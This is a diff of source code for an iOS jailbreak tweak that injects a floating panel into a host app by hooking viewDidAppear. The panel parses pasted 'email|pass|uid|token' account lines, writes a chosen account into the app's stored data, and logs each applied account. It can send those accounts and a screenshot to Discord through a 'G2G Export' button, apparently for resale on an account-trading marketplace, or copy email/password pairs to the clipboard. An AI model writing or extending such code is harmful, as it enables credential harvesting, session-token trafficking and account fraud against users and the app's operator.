+        self.editBtn.enabled = YES;
+        [self.editBtn setTitle:@"Edit (Fetch & Apply)" forState:UIControlStateNormal];
+        self.editBtn.backgroundColor = [UIColor colorWithRed:0.18 green:0.72 blue:0.38 alpha:1];
+        if (!acc) {
+            [self showToast:[NSString stringWithFormat:@"Fetch failed:\n%@", errMsg]
+                    success:NO exit:NO];
+            return;
+        }
+        [self showConfirmCard:acc];
     });
 }
+
+- (void)tapPaste {
+    NSString *clipText = [UIPasteboard generalPasteboard].string;
+    if (!clipText.length) {
+        [self showToast:@"Clipboard is empty." success:NO exit:NO]; return;
+    }
+    NSDictionary *acc = nil;
+    for (NSString *line in [clipText componentsSeparatedByCharactersInSet:
+                             NSCharacterSet.newlineCharacterSet]) {
+        NSString *t = [line stringByTrimmingCharactersInSet:
+                       NSCharacterSet.whitespaceAndNewlineCharacterSet];
+        if (!t.length) continue;
+        acc = parseLine(t);
+        if (acc) break;
+    }
+    if (!acc) {
+        [self showToast:@"No valid account in clipboard.\nExpected: email|pass|uid|token"
+                success:NO exit:NO];
+        return;
+    }
+    [self showConfirmCard:acc];
+}
+
+// ── G2G Export — capture screen + send exports to Discord ────────────────────
+
+- (void)tapG2GExport {
+    NSMutableArray *exports = getExports();
+    if (!exports.count) {
+        [self showToast:@"No exports yet.\nUse Edit/Paste first." success:NO exit:NO];
+        return;
+    }
+
+    // Capture screenshot on main thread first, then send
+    UIImage *shot = captureScreen();
+
+    [self showToast:@"Sending to Discord…" success:YES exit:NO];
+
+    sendToDiscord(exports, shot, ^(BOOL success, NSString *msg) {
+        if (success) {
+            writeExports(@[]);       // clear exports after successful send
+            [self refreshInfo];
+            [self showToast:[NSString stringWithFormat:
+                @"G2G Export done ✓\n%lu account(s) sent.\nExport list cleared.",
+                (unsigned long)exports.count] success:YES exit:NO];
+        } else {
+            [self showToast:[NSString stringWithFormat:@"Discord send failed:\n%@", msg]
+                    success:NO exit:NO];
+        }
+    });
+}
+
+// ── Confirm card ──────────────────────────────────────────────────────────────
+
+- (void)showConfirmCard:(NSDictionary *)acc {
+    UIView *parent = self.superview ?: [self topVC].view;
+    if (!parent) return;
+
+    UIView *backdrop = [[UIView alloc] initWithFrame:parent.bounds];
+    backdrop.backgroundColor  = [UIColor colorWithWhite:0 alpha:0.50];
+    backdrop.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
+    [parent addSubview:backdrop];
+
+    UIView *card = [UIView new];
+    card.backgroundColor     = [UIColor colorWithRed:0.10 green:0.10 blue:0.14 alpha:1];
+    card.layer.cornerRadius  = 13;
+    card.layer.shadowColor   = UIColor.blackColor.CGColor;
+    card.layer.shadowOpacity = 0.70;
+    card.layer.shadowRadius  = 10;
+    card.layer.shadowOffset  = CGSizeMake(0, 4);
+    card.translatesAutoresizingMaskIntoConstraints = NO;
+    [parent addSubview:card];
+
+    UILabel *emailLbl = [UILabel new];
+    emailLbl.text = acc[@"email"];
+    emailLbl.textColor = UIColor.whiteColor;
+    emailLbl.font = [UIFont boldSystemFontOfSize:12];
+    emailLbl.textAlignment = NSTextAlignmentCenter;
+    emailLbl.numberOfLines = 1;
+    emailLbl.adjustsFontSizeToFitWidth = YES;
+    emailLbl.minimumScaleFactor = 0.7;
+    emailLbl.translatesAutoresizingMaskIntoConstraints = NO;
+    [card addSubview:emailLbl];
+
+    UILabel *uidLbl = [UILabel new];
+    uidLbl.text = [NSString stringWithFormat:@"UID: %@", acc[@"uid"]];
+    uidLbl.textColor = [UIColor colorWithWhite:0.55 alpha:1];
+    uidLbl.font = [UIFont systemFontOfSize:10];
+    uidLbl.textAlignment = NSTextAlignmentCenter;
+    uidLbl.translatesAutoresizingMaskIntoConstraints = NO;
+    [card addSubview:uidLbl];
+
+    NSString *tok = acc[@"token"];
+    UILabel *tokLbl = [UILabel new];
+    tokLbl.text = [NSString stringWithFormat:@"Token: %@…",
+        [tok substringToIndex:MIN((NSUInteger)12, tok.length)]];
+    tokLbl.textColor = [UIColor colorWithWhite:0.48 alpha:1];
+    tokLbl.font = [UIFont fontWithName:@"Courier" size:9] ?: [UIFont systemFontOfSize:9];
+    tokLbl.textAlignment = NSTextAlignmentCenter;
+    tokLbl.translatesAutoresizingMaskIntoConstraints = NO;
+    [card addSubview:tokLbl];
+
+    NSString *remStr = acc[@"remaining"];
+    UILabel *remLbl = [UILabel new];
+    remLbl.text = remStr ? [NSString stringWithFormat:@"Remaining: %@", remStr] : @"";
+    remLbl.textColor = [UIColor colorWithRed:0.40 green:0.78 blue:1.00 alpha:1];
+    remLbl.font = [UIFont systemFontOfSize:9];
+    remLbl.textAlignment = NSTextAlignmentCenter;
+    remLbl.translatesAutoresizingMaskIntoConstraints = NO;
+    [card addSubview:remLbl];
+
+    UIView *sep = [UIView new];
+    sep.backgroundColor = [UIColor colorWithWhite:0.22 alpha:1];
+    sep.translatesAutoresizingMaskIntoConstraints = NO;
+    [card addSubview:sep];
+
+    UIButton *applyBtn = [UIButton buttonWithType:UIButtonTypeCustom];
+    [applyBtn setTitle:@"Apply this account" forState:UIControlStateNormal];
+    [applyBtn setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
+    applyBtn.titleLabel.font = [UIFont boldSystemFontOfSize:12];
+    applyBtn.backgroundColor = [UIColor colorWithRed:0.18 green:0.62 blue:0.38 alpha:1];
+    applyBtn.layer.cornerRadius = 8;
+    applyBtn.translatesAutoresizingMaskIntoConstraints = NO;
+    [card addSubview:applyBtn];
+
+    UIButton *cancelBtn = [UIButton buttonWithType:UIButtonTypeCustom];
+    [cancelBtn setTitle:@"Cancel" forState:UIControlStateNormal];
+    [cancelBtn setTitleColor:[UIColor colorWithWhite:0.60 alpha:1] forState:UIControlStateNormal];
+    cancelBtn.titleLabel.font = [UIFont systemFontOfSize:11];
+    cancelBtn.backgroundColor = [UIColor colorWithWhite:0.16 alpha:1];
+    cancelBtn.layer.cornerRadius = 8;
+    cancelBtn.translatesAutoresizingMaskIntoConstraints = NO;
+    [card addSubview:cancelBtn];
+
+    [NSLayoutConstraint activateConstraints:@[
+        [card.centerXAnchor constraintEqualToAnchor:parent.centerXAnchor],
+        [card.centerYAnchor constraintEqualToAnchor:parent.centerYAnchor],
+        [card.widthAnchor constraintEqualToConstant:248],
+
+        [emailLbl.topAnchor constraintEqualToAnchor:card.topAnchor constant:14],
+        [emailLbl.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:12],
+        [emailLbl.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-12],
+
+        [uidLbl.topAnchor constraintEqualToAnchor:emailLbl.bottomAnchor constant:4],
+        [uidLbl.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:12],
+        [uidLbl.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-12],
+
+        [tokLbl.topAnchor constraintEqualToAnchor:uidLbl.bottomAnchor constant:3],
+        [tokLbl.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:12],
+        [tokLbl.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-12],
+
+        [remLbl.topAnchor constraintEqualToAnchor:tokLbl.bottomAnchor constant:3],
+        [remLbl.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:12],
+        [remLbl.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-12],
+
+        [sep.topAnchor constraintEqualToAnchor:remLbl.bottomAnchor constant:10],
+        [sep.leadingAnchor constraintEqualToAnchor:card.leadingAnchor],
+        [sep.trailingAnchor constraintEqualToAnchor:card.trailingAnchor],
+        [sep.heightAnchor constraintEqualToConstant:1],
+
+        [applyBtn.topAnchor constraintEqualToAnchor:sep.bottomAnchor constant:10],
+        [applyBtn.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:10],
+        [applyBtn.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-10],
+        [applyBtn.heightAnchor constraintEqualToConstant:40],
+
+        [cancelBtn.topAnchor constraintEqualToAnchor:applyBtn.bottomAnchor constant:6],
+        [cancelBtn.leadingAnchor constraintEqualToAnchor:card.leadingAnchor constant:10],
+        [cancelBtn.trailingAnchor constraintEqualToAnchor:card.trailingAnchor constant:-10],
+        [cancelBtn.heightAnchor constraintEqualToConstant:32],
+
+        [card.bottomAnchor constraintEqualToAnchor:cancelBtn.bottomAnchor constant:12],
+    ]];
+
+    void (^dismiss)(void) = ^{
+        [UIView animateWithDuration:0.15 animations:^{
+            backdrop.alpha = 0; card.alpha = 0;
+        } completion:^(BOOL _) {
+            [backdrop removeFromSuperview]; [card removeFromSuperview];
+        }];
+    };
+
+    objc_setAssociatedObject(backdrop, "dismissBlock", [dismiss copy], OBJC_ASSOCIATION_COPY_NONATOMIC);
+    UITapGestureRecognizer *bgTap = [[UITapGestureRecognizer alloc]
+        initWithTarget:self action:@selector(backdropTapped:)];
+    bgTap.cancelsTouchesInView = NO;
+    [backdrop addGestureRecognizer:bgTap];
+
+    [applyBtn sk_setActionBlock:^{
+        dismiss();
+        NSMutableArray *exports = getExports();
+        [exports addObject:acc];
+        writeExports(exports);
+        applyAccount(acc);
+        [self refreshInfo];
+        NSString *msg = [NSString stringWithFormat:
+            @"Applied\n\nEmail : %@\nUID   : %@\nToken : %@…\n\nUD patched · files backed up\nClosing…",
+            acc[@"email"], acc[@"uid"],
+            [tok substringToIndex:MIN((NSUInteger)10, tok.length)]];
+        [self showToast:msg success:YES exit:YES];
+    }];
+
+    [cancelBtn sk_setActionBlock:^{ dismiss(); }];
+
+    card.alpha = 0; backdrop.alpha = 0;
+    [UIView animateWithDuration:0.18 animations:^{ backdrop.alpha = 1; card.alpha = 1; }];
+}
+
+- (void)backdropTapped:(UITapGestureRecognizer *)g {
+    void (^d)(void) = objc_getAssociatedObject(g.view, "dismissBlock");
+    if (d) d();
+}
+
+- (void)tapExport {
+    NSMutableArray *exports = getExports();
+    if (!exports.count) {
+        [self showToast:@"Nothing to export.\nUse Edit first." success:NO exit:NO]; return;
+    }
+    NSMutableString *out = [NSMutableString new];
+    for (NSDictionary *a in exports)
+        [out appendFormat:@"%@|%@\n", a[@"email"], a[@"pass"]];
+    [UIPasteboard generalPasteboard].string = out;
+    writeExports(@[]);
+    [self refreshInfo];
+    [self showToast:[NSString stringWithFormat:
+        @"Copied %lu account(s) to clipboard.\nExport list cleared.",
+        (unsigned long)exports.count] success:YES exit:NO];
+}
+
+- (void)showToast:(NSString *)msg success:(BOOL)ok exit:(BOOL)ex {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        UIView *parent = self.superview ?: [self topVC].view;
+        UILabel *t = [UILabel new];
+        t.text            = msg;
+        t.textColor       = UIColor.whiteColor;
+        t.font            = [UIFont systemFontOfSize:11];
+        t.backgroundColor = ok
+            ? [UIColor colorWithRed:0.08 green:0.20 blue:0.10 alpha:0.97]
+            : [UIColor colorWithRed:0.20 green:0.08 blue:0.08 alpha:0.97];
+        t.layer.cornerRadius = 9;
+        t.layer.borderColor  = ok
+            ? [UIColor colorWithRed:0.28 green:0.78 blue:0.38 alpha:0.5].CGColor
+            : [UIColor colorWithRed:0.78 green:0.28 blue:0.28 alpha:0.5].CGColor;
+        t.layer.borderWidth  = 1;
+        t.clipsToBounds = YES;
+        t.numberOfLines = 0;
+        t.textAlignment = NSTextAlignmentCenter;
+        t.translatesAutoresizingMaskIntoConstraints = NO;
+        [parent addSubview:t];
+        [NSLayoutConstraint activateConstraints:@[
+            [t.centerXAnchor constraintEqualToAnchor:parent.centerXAnchor],
+            [t.centerYAnchor constraintEqualToAnchor:parent.centerYAnchor],
+            [t.widthAnchor constraintLessThanOrEqualToAnchor:parent.widthAnchor constant:-40],
+        ]];
+        NSTimeInterval delay = ex ? 2.8 : 1.8;
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delay * NSEC_PER_SEC)),
+                       dispatch_get_main_queue(), ^{
+            [UIView animateWithDuration:0.3 animations:^{ t.alpha = 0; }
+                             completion:^(BOOL _) { [t removeFromSuperview]; if (ex) exit(0); }];
+        });
+    });
+}
+
+- (void)onPan:(UIPanGestureRecognizer *)g {
+    CGPoint d  = [g translationInView:self.superview];
+    CGRect  sb = self.superview.bounds;
+    CGFloat nx = MAX(self.bounds.size.width/2,  MIN(sb.size.width  - self.bounds.size.width/2,  self.center.x + d.x));
+    CGFloat ny = MAX(self.bounds.size.height/2, MIN(sb.size.height - self.bounds.size.height/2, self.center.y + d.y));
+    self.center = CGPointMake(nx, ny);
+    [g setTranslation:CGPointZero inView:self.superview];
+}
+
+- (UIViewController *)topVC {
+    UIViewController *vc = nil;
+    for (UIWindow *w in UIApplication.sharedApplication.windows.reverseObjectEnumerator)
+        if (!w.isHidden && w.alpha > 0 && w.rootViewController) { vc = w.rootViewController; break; }
+    while (vc.presentedViewController) vc = vc.presentedViewController;
+    return vc;
+}
+
+@end
+
+#pragma mark - Injection
+
+static SKPanel *gPanel = nil;
+
+static void injectPanel(void) {
+    UIWindow *win = nil;
+    for (UIWindow *w in UIApplication.sharedApplication.windows)
+        if (!w.isHidden && w.alpha > 0) { win = w; break; }
+    if (!win) return;
+    UIView *root = win.rootViewController.view ?: win;
+    gPanel = [SKPanel new];
+    gPanel.center = CGPointMake(gPanel.bounds.size.width / 2 + 8, 80);
+    [root addSubview:gPanel];
+    [root bringSubviewToFront:gPanel];
+}
+
+%hook UIViewController
+- (void)viewDidAppear:(BOOL)animated {
+    %orig;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
+                       dispatch_get_main_queue(), ^{ injectPanel(); });
+    });
+}
+%end
